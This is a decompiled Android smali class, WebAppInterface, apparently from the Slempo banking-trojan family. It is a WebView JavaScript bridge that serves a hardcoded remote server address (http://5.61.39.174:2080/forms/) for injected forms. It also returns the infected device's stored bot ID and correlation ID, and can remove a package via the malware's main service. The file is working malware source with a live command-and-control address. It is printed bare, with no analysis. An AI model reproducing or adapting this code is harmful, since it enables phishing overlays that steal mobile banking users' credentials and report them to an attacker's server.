.class public Lorg/slempo/service/WebAppInterface;
.super Ljava/lang/Object;
.source "WebAppInterface.java"


# instance fields
.field private final context:Landroid/app/Activity;

.field private final correlationID:I

.field private final packageNameForHtml:Ljava/lang/String;

.field private final settings:Landroid/content/SharedPreferences;


# direct methods
.method public constructor <init>(Landroid/app/Activity;I)V
    .locals 2
    .param p1, "context"    # Landroid/app/Activity;
    .param p2, "correlationID"    # I

    .prologue
    .line 16
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 17
    iput-object p1, p0, Lorg/slempo/service/WebAppInterface;->context:Landroid/app/Activity;

    .line 18
    iput p2, p0, Lorg/slempo/service/WebAppInterface;->correlationID:I

    .line 19
    const-string v0, ""

    iput-object v0, p0, Lorg/slempo/service/WebAppInterface;->packageNameForHtml:Ljava/lang/String;

    .line 20
    const-string v0, "AppPrefs"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Landroid/app/Activity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lorg/slempo/service/WebAppInterface;->settings:Landroid/content/SharedPreferences;

    .line 21
    return-void
.end method

.method public constructor <init>(Landroid/app/Activity;Ljava/lang/String;)V
    .locals 2
    .param p1, "context"    # Landroid/app/Activity;
    .param p2, "packageName"    # Ljava/lang/String;

    .prologue
    const/4 v1, 0x0

    .line 23
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 24
    iput-object p1, p0, Lorg/slempo/service/WebAppInterface;->context:Landroid/app/Activity;

    .line 25
    iput v1, p0, Lorg/slempo/service/WebAppInterface;->correlationID:I

    .line 26
    iput-object p2, p0, Lorg/slempo/service/WebAppInterface;->packageNameForHtml:Ljava/lang/String;

    .line 27
    const-string v0, "AppPrefs"

    invoke-virtual {p1, v0, v1}, Landroid/app/Activity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lorg/slempo/service/WebAppInterface;->settings:Landroid/content/SharedPreferences;

    .line 28
    return-void
.end method


# virtual methods
.method public closeSuccessDialog()V
    .locals 1

    .prologue
    .line 31
    iget-object v0, p0, Lorg/slempo/service/WebAppInterface;->context:Landroid/app/Activity;

    invoke-virtual {v0}, Landroid/app/Activity;->finish()V

    .line 32
    return-void
.end method

.method public getID()Ljava/lang/String;
    .locals 3

    .prologue
    .line 35
    iget-object v0, p0, Lorg/slempo/service/WebAppInterface;->settings:Landroid/content/SharedPreferences;

    const-string v1, "APP_ID"

    const-string v2, "-1"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getLink()Ljava/lang/String;
    .locals 1

    .prologue
    .line 39
    const-string v0, "http://5.61.39.174:2080/forms/"

    return-object v0
.end method

.method public textToCommand(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 1
    .param p1, "command"    # Ljava/lang/String;
    .param p2, "params"    # Ljava/lang/String;

    .prologue
    .line 43
    const-string v0, "getID"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 44
    invoke-virtual {p0}, Lorg/slempo/service/WebAppInterface;->getID()Ljava/lang/String;

    move-result-object v0

    .line 53
    :goto_0
    return-object v0

    .line 45
    :cond_0
    const-string v0, "getLink"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 46
    invoke-virtual {p0}, Lorg/slempo/service/WebAppInterface;->getLink()Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    .line 47
    :cond_1
    const-string v0, "closeSuccessDialog"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 48
    iget-object v0, p0, Lorg/slempo/service/WebAppInterface;->packageNameForHtml:Ljava/lang/String;

    invoke-static {v0}, Lorg/slempo/service/MainService;->removePackage(Ljava/lang/String;)V

    .line 49
    invoke-virtual {p0}, Lorg/slempo/service/WebAppInterface;->closeSuccessDialog()V

    .line 53
    :cond_2
    const-string v0, ""

    goto :goto_0

    .line 50
    :cond_3
    const-string v0, "getCorrelationID"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 51
    iget v0, p0, Lorg/slempo/service/WebAppInterface;->correlationID:I

    invoke-static {v0}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v0

    goto :goto_0
.end method
